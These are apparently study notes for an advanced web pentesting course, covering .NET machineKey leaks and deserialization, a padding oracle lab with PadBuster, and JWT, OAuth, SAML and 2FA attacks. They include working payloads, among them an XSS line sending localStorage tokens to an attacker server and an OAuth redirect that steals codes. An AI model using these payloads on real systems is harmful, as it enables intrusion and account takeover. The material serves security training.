https://msdn.microsoft.com/en-us/data/w8h3skw9(v=vs.110)   Its a feature used to specify encryption settings For application services, such as view state, forms authentication and roles in a system.      Machine Key contains a set of fields like validation key, decryption key and so on where unique keys are to be entered.         Leveraging a leaked machineKey for RCE  Scenario, we are pentesting a .NET application      The application offers file uploading functionality (the ‘aspx’, ‘.config’,’.ashx’, ‘.asmx’, ‘aspq’, ‘.axd’,’.cshtml’,’.cshtml’,’.rem’,’.soap’,’.vbhtm’, ‘.vbhtml’,’.asa’,’.asp’, and ‘.cer’ extensions are blacklisted.   Validation of viewstate MAC is performed (this prevents deserialization exploitation without knowing the cryptographic key - machineKey)      Our only change is to find the machine Key    We can try uploading the following, in attempt to leak the machine key:  &lt;!--#include file=\"..\\..\\web.config\" --&gt; // test.shtml   Attempt successfull, we can open view source code to retrieve its contents   Now we need to figure out how the MAC generated and verified:  - https://referencesource.microsoft.com/#system.web/UI/ObjectStateFormatter.cs - https://referencesource.microsoft.com/#System.Web/Configuration/MachineKeySection.cs   If u read the above, u will conclude to the below logic:  - MAC_HASH = MD5(serialized_data_binary + validation_key + 0x00000000) - VIEWSTATE = Base64_Encode(serialized_data_binary + MAC_HASH)   Exploitation  We need the YsoSerial.net and to implement the MAC-related logic of the previous information  ysoserial.exe -o base64 -g TypeConfuDelegate -f ObjectStateformatter -c \"cmd /c ping &lt;attacker ip&gt;\"         In this case, we did not attack crypto per se. Instead, we leveraged the SSI feature of the underlying server to leak the cryptographic key       Implementing strong crypto is important, but protecting the cryptographic key is of equal importance.    Subverting HMAC Scenario  Example of HMAC can be subverted through Remote Memory Disclosure in Node.js   The source code of the vuln app will be provided, so we can try the attack locally  - https://en.wikipedia.org/wiki/HMAC   Lab   Setup code      https://github.com/GDSSecurity/PaddingOracleDemos   Solution   Step 1: Open the lab link to access the Kali GUI instance.   …   Step 2: Check if the provided machine/domain is reachable.   Command:  ping -c3 demo.ine.local      The provided machine is reachable.   Step 3: Check open ports on the provided machine.   Command:  nmap -sS -sV demo.ine.local      Port 80 is open on the target server. Werkzeug httpd server is running on that port.    Step 4: Check the web application available on port 80.   Encrypt the following plaintext:  ApplicationUsername=user&amp;Password=sesame      Visit the following URL for encrypting the above plaintext (make sure to URL encode the = and &amp; characters):   URL: http://demo.ine.local/encrypt?plain=ApplicationUsername%3duser%26Password%3dsesame   Encrypted text is: 6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80   Step 5: Decrypt the ciphertext.   To decrypt the ciphertext, we can visit the /echo endpoint and provide the ciphertext:   URL: http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80      The plaintext message was successfully retrieved.    Step 6: Confirm a padding oracle’s presence.   A padding oracle’s presence can be identified as follows - Try to tamper with the correct encrypted string and notice the exceptions (notice the “gg” part at the beginning of the ciphertext):  URL: http://demo.ine.local/echo?cipher=gg664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80      Notice the exception. The application expected hexadecimal digits but found non-hexadecimal digits instead (letter ‘g’).   Now check the response from the following URL:      URL: http://demo.ine.local/echo?cipher=g   Now check the response from the following URL:  URL: http://demo.ine.local/echo?cipher=6b   These errors may suggest that:  - The string consists of hexadecimal characters (0-0xff) - The string has to be aligned to two characters - The string is being decrypted somehow      Since different strings produced different exceptions, there might be a chance to perform a padding oracle attack here.   Step 7: Decrypt the encrypted data by performing a padding oracle attack.      PadBuster is started with the following arguments in our attempt to decrypt the encrypted data:    Command:  padbuster \"http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80\" \"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80\" 16 -encoding 1   The following are the options provided to the PadBuster tool:  - The target URL containing the ciphertext - The ciphertext itself - Block size (128 bits = 16 bytes) - Encoding type 1 = lowercase hex (which was confirmed by experimenting with the endpoint in the previous step)   You would be prompted with the following message:   Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended :  Enter 2.      Padbuster was able to recover two blocks of the plaintext message:    Block 1 Results:  [+] Cipher Text (HEX): b8f1335522753d45174435c16b52dc2e [+] Intermediate Bytes (HEX): 0a0b2bcd40ec8741c671cc45c25ae140 [+] Plain Text: ame=user&amp;Passwor   Block 2 Results:  [+] Cipher Text (HEX): 5bbd4363b9d91d4c9100beae6ce34e80 [+] Intermediate Bytes (HEX): dccc4030511450201f4c3dc9635ad426 [+] Plain Text: d=sesame   Decrypted value: ame=user&amp;Password=sesame   PadBuster revealed that behind the encrypted string, there is the ame=user&amp;Password=sesame string.   However, if you take a look at the decrypted blocks, they are just 2/3 of the entire ciphertext.   The first part, which is equal to 1/3 of the length, was not decrypted. It may contain other parameters or the full name of the first parameter.      This happened because the first block is XOR’d with the initialization vector (IV), which is not known to us.    Image Source: https://samsclass.info/141/proj/p11pad9.png      To get the first block, we would need the IV.    Step 8: Recreate the missing parameter and obtain the key.   Visit the /check endpoint and provide the ciphertext, and it will give back the complete details about the encrypted string:  URL: http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80   The decrypted as well as the parsed content is shown in the response.      We now know that the full parameter name is ApplicationUsername. This should be the content of the first, previously not decrypted, block 6b664ef0359fe233e021ad36b12d8e32.   So far, we know that we have three blocks:  6b664ef0359fe233e021ad36b12d8e32 -&gt; ApplicationUsern b8f1335522753d45174435c16b52dc2e -&gt; ame=user&amp;Passwor 5bbd4363b9d91d4c9100beae6ce34e80 -&gt; d=sesame      To obtain the key, we need to run Padbuster with the following arguments:    Command:  padbuster \"http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32\" \"6b664ef0359fe233e021ad36b12d8e32\" 16 -encoding 1 -error \"ApplicationUsername missing\" -prefix \"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e\" -noiv   The reason for these arguments is the following:  - We use just the first block of the whole encrypted string - the one that was not decrypted - Next, we specify 16 bytes as the block size and lowercase hex encoding - error tells the application what string to look for in the response page to treat it as the error (we could have identified that error message by requesting something like http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34eff and the response would indicate of the invalid padding) - noiv is used to get the intermediate value after decrypting the first block.   Obtaining the key will look as follows:   Block 1 Results:  [+] Cipher Text (HEX): 6b664ef0359fe233e021ad36b12d8e32 [+] Intermediate Bytes (HEX): 221449095f050045505c5e671003460d [+] Plain Text: \"I      _EP\\^gF   Step 10: Retrieving the signing key.  To get the key, we need to XOR the hex representation of the ciphertext (Intermediate bytes - hex for \"I _EP\\^gF) with the hex representation of \"ApplicationUsern\", which is 0x4170706c69636174696f6e557365726e.  # Visit a XOR calculator website like https://xor.pw:   Provide the following hex values in the input fields:  Input 1: 4170706c69636174696f6e557365726e Input 2: 221449095f050045505c5e671003460d   The result is 0x63643965366661313933303263663463, which translates to cd9e6fa19302cf4c in ASCII (coverted using https://www.rapidtables.com/convert/number/hex-to-ascii.html):   Signing Key: cd9e6fa19302cf4c   Step 11: Craft a custom username and password.   To make the application receive authorization as the username and bypass as the password, we would provide similar arguments to PadBuster, as before, like the ones set to obtain the encryption key.      PadBuster’s base will be the first block with the prefix and the same error indicator. The only addition is padding to the plaintext to close the “previous” argument when encrypting (we need data in the below format):   Application_garbage_data=xyz&amp;ApplicationUsername=authorization&amp;Password=bypass   Note that =xyz can be replaced with =anything&amp; as we just want to close the first argument in the GET request. Otherwise, all the encrypted data would be understood by the application as the value of the previous parameter and would not be treated as username and password values:   Command:  padbuster \"http://demo.ine.local/check?cipher=6b664ef0359fe233e021ad36b12d8e32\" \"6b664ef0359fe233e021ad36b12d8e32\" 16 -encoding 1 -error \"ApplicationUsername missing\" -prefix \"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e\" -plaintext \"=xyz&amp;ApplicationUsername=authorization&amp;Password=bypass\"   Once the tool finishes its work, you should get back the following output:  [+] Encrypted value is: 5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000   Step 12: Confirm the modification done to the username and the password.   Send the encrypted value for authentication, to the /check endpoint:  URL: http://demo.ine.local/check?cipher=5455c513e812a5bfbddfa75194573f07d4ddee7f0f8ec540644a5e38679f39ea17f4add5e45ec7f74119ade4bf6e2615ab0b799bb09f03bb7dc3260512cf1a7400000000000000000000000000000000      We can see that the application correctly recognized the forged username and password. In a real-life scenario, the ability to tamper with insufficiently encrypted data might result in an effective authorization bypass.    Root Cause:   The padding oracle attack is meant to illustrate the idea that something as innocuous as revealing whether the padding is valid or not can reveal a lot of information when abused in the right context.   Prevention:  - Use GCM/No Padding rather than CBC Padding mode. - Catch all decryption errors and return generic messages instead of reporting specific padding errors. - Implement Encrypt-then-MAC. In case a cipher arriving at the server was tampered with,    it will be dropped before any padding information is leaked. - Limit requests coming from the same source.   Reference: https://www.youtube.com/watch?v=lkPBTJ3yiCI   References  - https://github.com/AonCyberLabs/PadBuster - https://www.youtube.com/watch?v=lkPBTJ3yiCI  ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/crypto/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser13.jpg"
      },{
        "title": "13 - Authentication & SSO",
        "excerpt":"  Attacking Authentication &amp; SSO      Authentication in Web Apps   Attacking JWT   Attacking Oauth   Attacking SAML   Bypassing 2FA   Objectives:      How to attack modern authentication and SSO implementations   The weak spots of JWT, SAML, OAth and 2FA   Authentication in Web Apps  Its the process of utilizing a credential, known as an identity, to validate that the identify has permission to access the resource. In this case, the resource is the web application.   We will focus on discussing authentication performed through a username/password combination, secret token (cookie), or a ping code   Some Features that web app uses     JSON Web Token (JWT) - A compact mechanism used For transfering claims between two parties   OAuth - Enables a third-party application to obtain limited access to an HTTP service, either on behalf of a resource owner by orchestrating an approval interaction between the resource owner and the hTTP service, or by allowing the third-party application to obtain access on its own behalf   Security Assertion Markup Language (SAML) - An XML based single sign-on login standard   Moreover:  - https://tools.ietf.org/html/rfc7519 - https://tools.ietf.org/html/rfc6749 - https://tools.ietf.org/html/rfc7522   2FA  Modern Web Apps also utilize an extra layer of defense when it comes to authentication, 2 factor authentication (2FA)   Its a method to verify a users identity by utilizing a combination of two different factors:  - Something you know (password) - Something you have (OTP) - Something you are  (biometric)   2FA Bypasses  - Brute Force (when a secret of limited length is utilized) - Less common interfaces (mobile app, XMLRPC, API instead of web) - Forced Browsing - Predictable/Reusable Tokens   JSON Web Tokens (JWT)  According to the official JSON website (https://jwt.io/introduction/), a JWT consists of the following 3 piece in its structure:  - Header - Payload - Signature   In a header, you will find the following:  - Type of the token - Signing algorithm      While in a payload u will find the claims    The ‘signature’ consists of signing:  - Encoded header - Encoded payload - A secret - Algorithm specified in the header   To sign an unsigned token, the process is as follows:  - unsignedToken = encodedBase64(header) + '.' + encodedBase64(payload) - signature_encoded = encodedBase64(HMAC-SHA256(\"secret\", unsignedToken)) - jwt_token = encodedBase64(header) + \".\" + encodedBase64(payload) + \".\" + signature_encoded   JWT Security Facts  JWT is not vuln to CSRF (except when JWT is put in a cookie)      Session theft through an XSS attack is possible when JWT is used   Improper token storage (HTML5 storage/cookie)   Sometimes the key is weak and can be brute-forced   Faulty token expiration   JWT can be used as Bearer token in a custom authorization header   JWT is being used For stateless applications. JWT usage results in no server-side storage and database-based session management. All info is put inside a signed JWT token:      only relying on the secret key   logging out or invalidating specific users is not possible due to the above stateless approach. The same signing key is used For everyone.   JWT-based authentication can become insecure when client-side data inside the JWT are blindly trusted   Many apps blindly accept the data contained in the payload (no signature verification)  - try submitting various injection-related strings - try changing a users role to admin   Many apps have no problem accepting an empty signature (effectively no signature)  - the above is also known as \"the admin party in JWT\" - this is by design, to support cases when tokens have already been verified through another way - when assessing JWT endpoints set the alg to none and specify anything in the payload   Moreover JWT Security information:   → https://www.reddit.com/r/netsec/comments/dn10q2/practical_approaches_for_testing_and_breaking_jwt/   Tools for assessing/attacking JWT  → https://github.com/KINGSABRI/jwtear   HMAC SHA256 signed token creation example:  jwtear --generate-token --header '{\"typ\":\"JWT\",\"alg\":\"HS256\"}' --payload '{\"login\":\"admin\"}' --key 'cr@zyp@ss'   Empty signature token creating example:  jwtear --generate-token --header '{\"typ\":\"JWT\",\"alg\":\"none\"}' --payload '{\"login\":\"admin\"}'   Testing For injection example:  jwtear --generate-token --header '{\"typ\":\"JWT\",\"alg\":\"none\"}' --payload $'{\"login\":\"admin\\' or \\'a\\'=\\'a\"}'                  \" // $ is used to escapse single quotes   JWT Attack Scenario 1  brute-forcing/guessing the secret used to sign a token:      JWT Attack Scenario 2  When attacking authentication through an XSS vuln, we usually try to capture a victims cookie as follows:  &lt;script&gt;alert(document.cookie)&lt;/script&gt;   When JWT is employed an localStorage is used, we can attack authentication through XSS using JSON.stringify:   &lt;img src='https://attacker-server/yikes?jwt='+JSON.stringify(localStorage);'--!&gt;      If u obtain an IdToken, u can use it to authenticate and impersonate the victim If u obtain an accessToken, u can use it to generate a newIdToken with the help of the authentication endpoint    JWT Attack Scenario 3  A bitcoin CTF challenge that included JWT:      uppon successful login, the user is issued a JWT inside a cookie   HS256 is used   A user named admin exists   One of the field in the JWT header, kid, is used by the server to retrieve the key and verify the signature. The problem is that no proper escaping takes place while doing so.      If an attacker manages to control or inject to kid’, he will be able to create his own signed tokens (since kid is essentially the key that is used to verify the signature)    What we can do: Inject kid and specify a value that resides on the web server and can be predicted (as well as retrieved by the server of course)      through provoking errors we identified that the application is using sinatra under the hood   such a value could be ‘public/css/bootstrap.css’ &lt;- this value comes from sinatras documentation/best practices and its a legitimate value since no proper escaping occurs while retrieving kid         OAuth  Its the main web standard For authorization between services. Its used to authorize 3rd party apps to access services or data from a provider with which you have an account.   OAuth Components:     Resource Owner: the entity that can grant access to a protected resource. Typically this is the end-user   Client: an application requesting access to a protected resource on behalf of the resource owner. This is also called a Relying Party   Resource Server: the server hosting the protected resources. This is the API you want to access, in our case gallery   Authorization server: the server that authenticates the Resource Owner, and issues access tokens after getting proper authorization. This is also called an identity provider (IdP)   User Agent: the agent used by the Resource Owner to interact with the Client, For example a browser or a mobile application.   OAuth Scopes (actions or privilege requested from the service - visible through the scope parameter):  - Read - Write - Access Contacts   OAuth 2.0     The authorization code grant: the client redirects the user (Resource Owner) to an Authorization server to ask the user whether the Client can access her Resources. After the user confirms, the Client obtains an Authorization Code that the Client can exchange For an Access Token. This Access Token enables the Client to access the Resources of the Resources Owner.   The implicit grant is a simplification of the authorization code grant. The client obtains the Access Token directly rather than being issued an Authorization Code.   The resource owner password credentials grant enables the Client to obtain an Access Token by using the username and password of the Resource Owner.   The client credentials grant enables the Client to obtain an Access Token by using its own credentials.      Clients can obtain Access Tokens via 4 different flows Clients use these Access Tokens to access an API       The Access Tokens is almost always a bearer token Some applications use JWT as access tokens    Common OAuth Attacks      Unvalidated RedirectURI Parameter  If the authorization server does not validate that the redirect URI belongs to the client, its susceptible to two types of attacks:      Open Redirect   Account hijacking by stealing authorization codes.         If an attacker redirects to a site under their control, the authorization code - which is part of the URI - is given to them.  They may be able to exchange if For an access token and thus get access to the users resources.    Weak Authorization Codes  If the authorization codes are weak, an attacker may be able to guess them at the token endpoint. This is especially true if the client secret is compromised, not used, or not validated.      Everlasting Authorization Codes  Expiring unused authorization codes limits the window in which an attacker can use captured or guessed authorization codes, but thats not always the case.      Authorization Codes Not Bound to Client  An attacker can exchange captured or guessed authorization codes For access tokens by using the credentials For another, potentially malicious, client.      Weak Handle-Based Access and Refresh Tokens  If the tokens are weak, an attacker may be able to guess them at the resource server or the token endpoint.      Insecure Storage of Handle-Based Access and Refresh Tokens  If the handle-based tokens are stored as plain text, an attacker may be able to obtain them from the database at the resource server or the token endpoint.      Refresh Token not Bound to Client  If the binding between a refresh token and the client is not validated, a malicious client may be able to exchange captured or guessed refresh tokens For access tokens. This is especially problematic if the application allows automatic registration of clients.      OAuth Attack Scenario 2  In this scenario, we r gonna see an OAuth-Based XSS vuln was chained with an insecure X-Frame-Options header and an enabled Autocomplete functionality to provide the attacker with User/Admin credentials.      This attack was discovered when pentesting the first iterations of the Open Bank Project (OBP)    Step 0: We identified that the redirectUrl parameter is vulnerable to reflected cross-site scripting (XSS) attacks due to inadequate sanitization of user supplied data.  Vulnerable parameter: 'redirectUrl' Page resource: 'http://openbankdev:8080/oauth/thanks' Attack vector: http://openbankdev:8080/oauth/thanks?redirectUrl=[JS attack vector]   Step 1:   The following image displays that we were able to load a malicious JavaScript into the vulnerable OBP web page from an external location. The payload depicted is jQuery specific.      Step 2:   Utilizing the inject JavaScript we created an invisible iframe that contained OBPs login page. That was possible due to the fact that the X-Frame-Options header of OBPs login page was set to the SAMEORIGIN value.      Step 3:   We finally injected the following JavaScript code to access the iframes forms that contained user credentials due to the fact that Autocomplete functionality was not explictly disabled      Step 4:   A previously set up netcat listener received the targer users password      Bonus Step:   We also chained the above mentioned OAuth-based XSS vuln with the insufficiently secure X-Frame-Options header of the GET API Key page (which was set to SAMEORIGIN) and a CSRF vulnerability on the API creation functionality      Bonus Step:   We finally inject a JavaScript function, similar to the one used For the remote credential theft attack, to access the iframes contents including the created applications API key. This time, a remote API key theft attack occured.      OAuth Attack Scenario 3  Attacking the Connect request      This attack exploits the first request (when a user clicks the Connect or Sign in with button).   User are many times allowed by websites to connect additional accounts like Google, using OAuth. An attacker can gain access to the victims account on the Client by connecting one of his/her own account (on the Provider)      OAuth Attack Scenario 4  CSRF on the Authorization Response      OAuth 2.0 provides security against CSRF-like attacks through the state parameter. This parameter is passed in the 2nd and 3rd request of the OAuth dance. It acts like a CSRF token.   In newer implementations of OAuth, this paramater is not required and is optional.      If you come across in an implementation where this parameter is not utilized, you can try the attack flow on your right.       Security Assertion Markup Language (SAML)  Official documentation:  http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0-cd-02.html#2.Overview|outline      OASIS SAML defines an XML-based framework For describing and exchanging security information between on-line business partners.   it defines precise syntax and rules For requesting, creating, communicating, and using these SAML assertions.      SAML Security Considerations  An attacker may interfere during step 5 in the SAML Workflow and tamper with the SAML response sent to the service provider (SP). Values of the assertions released by IDP may be replaced this way.      An insecure SAML implementation may not verify the signature, allowing account hijacking   An XML canonicalization transform is employed while signing the XML document, to produce the identical dignature For logically or semantically similar documents.  https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability#cryptographic-signing-issues     SAML Attack Scenario  Suppose that we are assessing a SAML implementation   We want to check if an attacker is able to successfully tamper with the SAML response sent to the service provider (SP). In essence, we want to check if an attacker can replace the values of the assertions released by the IDP.      So, we copy the SAML Response (using BURP)   and programmatically change the username in the XML to one of an identified admin. The attack was not successful  Invalid Signature on SAML Response   Does this mean that the SAML implementation is secure? Lets try performing a signature stripping attack before saying so.   During signature stripping attacks against SAML, we simply remove the value of SignatureValue (the tag remains)      All we have to do is encode everything again and submit our crafted SAML Response   To our surprise, the remote server accepted our crafted request letting us log in as the targeted admin user         Have signature strpping attacks in mind, when assessing SAML implementations    Resources  - http://www.economyofmechanism.com/github-saml - https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e # its a BURP extension    Common 2FA Bypasses  - Brute Force (when a secret of limited length is utilized) - Less common interfaces (mobile app, XMLRPC, API instead of web) - Forced Browsing - Predictable / Reusable Tokens   Less common interfaces      How attackers usually bypass 2FA during MS Exchange attacks   How we were able to bypass the 2FA implementation of a stock/insurance management website   2FA Bypass Scenario 1  Exchange Web Services (EWS) is a remote access protocol      Its essentially SOAP over HTTP is used prevalently across applications, Windows mobile devices etc., and especially in newer versions of Exchange   Such as attack against Exchange can be performed using the MailSniper tool   →  https://github.com/dafthack/MailSniper   // after identifying valid credentials   Import-Module .\\MailSniper.ps1 Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -remote      Trying the above tool on our testing domain, ELS, against the 2FA protected JeremyDoyle@els.local account returned the following.   Access to the users mailbox was achieved using only the identified credentials.   2FA was successfully subverted      2FA Bypass Scenario 2  During an external pentest, we came across a 2FA implementation on a web application that was related to stock/insurance management. As part of the assessment, we tried to bypass the 2FA implementation by leveraging the fact that the mobile channel didnt offer a 2FA option   A malicious non-2FA user somehow find a 2FA-users credentials (For example through a social engineering attack)      The malicious user wants to login, using the acquired credentials, through the web app and not through the mobile app since the web app has additional functionality.   To achieve that he will have to find a way to bypass the 2FA mechanism in place   Step by Step     We logged in through the mobile application as a non-2FA user (the attacker), wrote down the encrypted CSRF token For later use and kept the session alive         We initiated a login sequence as the 2FA user, whose credentials were acquired, through the web app but manipulated the login sequence requests so that they were processed through the mobile applications backend.      During the above mentioned login sequence manipulation steps we used the cookie values supplied by the web app backend            We performed a POST request through the browser requesting      https://uat.xxxx.com/xxxParticipant/mobile/services/initial_load.htm:ENC=[attacker CSRF token]   using the CSRF token of the non-2FA user (the attacker) and the 2FA users cookies, as mentioned above.         The web app responded with a 403 Authorization error message, twice.         We performed a GET request through the browser requesting      https://uat.xxxx.com/xxxParticipant   And we were finally able to browser through the web app as the 2FA user bypassing the 2FA mechanism in place.      Lab   Network Configuration  - The target application can be found at http://gallery:3005 - The username is koen and the password is password.   Tasks   Task 1. Create a code stealing PoC:  - Craft an URL that can be sent to a victim in order to steal the authorization code once he/she logs in into the /oauth endpoint.  - You can use the following data: the response type is \"code\", the scope is \"view_gallery\" and the client_id is \"photoprint\".   Task 2. Use the acquired code to bruteforce the client secret:  - Use a POST request to the /token endpoint in order to bruteforce the  client secret.  - Consult with OAuth's documentation to recreate the  request. The grant type is \"authorization_code\"  Task 3. Discover another token vulnerability:  - Discover another vulnerability by abusing the /photos/me?access_token= endpoint.   Solutions  Below, you can find solutions for each task. Remember though, that  you can follow your own strategy, which may be different from the one  explained in the following lab.   Task 1. Create a code stealing PoC   Based on OAuth’s documentation available on https://tools.ietf.org/html/rfc6749 you can construct the following GET request. Note that you have to be logged out upon visiting this URL.  http://gallery:3005/oauth/authorize?response_type=code&amp;redirect_uri=http%3A%2F%2Fattacker%2Fcallback&amp;scope=view_gallery&amp;client_id=photoprint   Upon logging in, there is a consent screen, which has to be accepted, just like a regular login via OAuth.   Then, the user is redirected to the attacker website with the  authorization code in the callback value. Any user that is sent the  above URL and will log in via it, will make a request to the attacker  website disclosing the authorization code.   The underlying vulnerability is an unvalidated redirection.   Task 2. Use the acquired code to bruteforce the client secret   Based on a sample Token request (https://auth0.com/docs/api-auth/tutorials/authorization-code-grant) you can construct the following POST request.  POST /token HTTP/1.1 Host: gallery:3005 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Content-Type: application/x-www-form-urlencoded Content-Length: 137 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1  redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&amp;grant_type=authorization_code&amp;client_id=photoprint&amp;client_secret=§guess§&amp;code=44438Note:       Copy-pasting the above request may result in  formatting issues that will cause the HTTP request to be malformed.   The  best way to reproduce that request is to log in as described in the  manual (by obtaining the first code), capture the request using Burp and  send it to Repeater.   Using Burp Intruder and a wordlist (we used Rockyou-10 available here) you can bruteforce the client secret.   After starting the attack, soon we realize that the client secret is secret.   In the Repeater window:  POST /token HTTP/1.1 Host: gallery:3005 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Content-Type: application/x-www-form-urlencoded Content-Length: 136 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&amp;grant_type=authorization_code&amp;client_id=photoprint&amp;client_secret=secret&amp;code=44438 Note: Specify the code that you received in the response.   The response access token can now be supplied to the /photos/me?access_token= endpoint. GET /photos/me?access_token=35580 HTTP/1.1 Host: gallery:3005 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1      [Note] Make sure to replace the access code in the above request with the one you get back from the request before this one.    Task 3. Discover another token vulnerability  # At /photos/me?access_token=[code] you are able to bruteforce the valid token. This will require the following Burp Intruder configuration:    GET /photos/me?access_token=§§ HTTP/1.1 Host: gallery:3005 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1      This way, an attacker is able to compromise active tokens via  bruteforce in an unlimited way.       [Note] In a real application there  might be multiple active tokens. As we have just one active token, the  time for bruteforcing it might be much longer.    ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web","bypass"],
        "url": "/notes/ewptx/authenticationsso/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser14.jpg"
      },{
        "title": "14 - APIs & Cloud Apps",
        "excerpt":"  APIs &amp; Cloud Apps      Introduction to APIs   API Testing &amp; Attacking   API Access Control   Resource Sharing   Attacking Cloud Based Applications   Objetives:      Attacking API based applications   Common vulnerabilities found in Cloud environments   Introduction to APIs  API = Application Programming Interface      Its a non-GUI collection of endpoints in a standardized form so it can be used by human user as well as a machine. Its often accompanied by documentation that can be in both a machine and a human-readable form   There are lots of APIs, For example:  - Windows API - Remote APIs (RPC  - remote procedure call) - Web APIs  # Web services (SOAP/XML) # REST APIs (JSON)    APIs differs from a website because:  - It has a standardized input/output form so that it can be scripted - Its language independent (it should work on each platform in the same way) - It aims to be secure (e.g. it allows only some predefined methods)   SOAP APIs utilizes the Simple Object Access Protocol to define communication standard - so how the request and response looks, as well as the parameters can be passed in them.   SOAP Messages (HTTP Requests) are an XML type and must contain some special elements  - Content type text/xml is also allowed - SOAPAction is sometimes used just For the standard and sometimes needs to hold the called method name         API Contains both human and machine-readable documentation. For SOAP-based APIs, the documentation is stored in WSDL files. Usually, these files are stored under the ?wsdl path   → https://api.example.com/api/?wsdl   Take a look at an examplary calculator service online:   → http://www.dneonline.com/calculator.asmx   At the following address:  → http://www.dneonline.com/calculator.asmx?op=Add # u can see an examplary SOAP request that was issued in order to speak to the calculator service  → http://www.dneonline.com/calculator.asmx?wsdl # to see the full WSDL   This kind of interface, equipped with documentation that can be parsed by a machine, allows us to expose a large number of methods where each of them has its own purpose.      Another type of API is REST (Representation State Transfer) APIs.   Usually, the method client is about to call is in the resource path:  GET /api/v2/methodName      Depending on the request type, the parameters might be passed differently   In REST APIs, HTTP methods have some special meaning:  GET    - Read   resource POST   - Create resource PUT    - Update resource DELETE - Delete resource PATCH  - Update resource partially   Except For GET requests, API methods parameters are passed in the request body      Remember, that the meaning of these methods is a common practice and not a requirement, so technically its possible that a method you encounter does something different (e.g. POST is used For logging in)    An exemplary REST API request:  - Path often contains the API version - Content-type application/json header is required - Parameters are passed as JSON array   Its also often possible to pass the REST API parameters as XML, so the equivalent of the request from the previous slide would look like the listing to the right   REST API also has a documentation standard called the WADL file.  https://www.w3.org/Submission/wadl/   Similar to WSDL, we will shortly present tools that help to parse the lengthy file in order not to rewrite all the methods manually.      In order to make dev (and pentester) lives easier, some APIs include a more human-friendly API representation. For example, a very popular API engine name Swagger is often found with its demo page, which contains forms with description and possibility to issue a request to each method.   You can see sample Swagger API here:  https://swagger.io/tools/swagger-ui/   Resources  - https://swagger.io/ - https://www.w3.org/TR/wsdl.html - https://www.w3.org/Submission/wadl/ - https://www.w3.org/TR/soap/   API Testing and Attacking  APIs are built in a way that one request path (one endpoint) allows us to call one method (execute one type of action).           The path we are requesting is an abstract mapping to some resources; that means, when requesting the endpoint /api/v3/methodName, it does not reflect file/directory structure on the server.       The request is processed by a special component that maps the path to certain operation handlers and not to physical file/directory resources   However, do not be discouraged from using your favorite content discovery tools on the API enabled server. Some server paths can be mapped to the API routines, but still, some requests can be handled by the server in an original way allowing it to expose files and directories to the user.   Regardless of the fact that APIs make use of predefined methods, you should be aware that there can still be vulnerabilities related to:  - Parameters to these predefined functions - The API parsing itself - Access to sensitive methods   First u should focus on the proper reconnaissance of the API interface:  - What is the API name and version? - Its a custom implementation or a open-source product? - Is there any online documentation available? - Are there any interesting methods? - Does the documentation exist on the target server (?wsdl, ?wadl, or similar)? - Does the API require authentication, or is publicy available? - If there is both local and public documentation For an API, do they match? - Maybe some methods were hidden from local users (typically ones that allow insecure operations)      Gather as many API endpoints as possible  U should also be able to get the WSDL/WADL file For further testing       Reconstructing API calls from a raw WSDL/WADL file would be time-consuming, so a proper tool might help you to do it faster.   For API testing and parsing WSDL/WADL files into a ready-to-use method set, you might want to use Postman, the free edition of SOAPUI, or the Burp PRO extension called WSDLer   SOAPUI  → https://www.soapui.org/downloads/latest-release.html   SoapUI can be launched from its default location  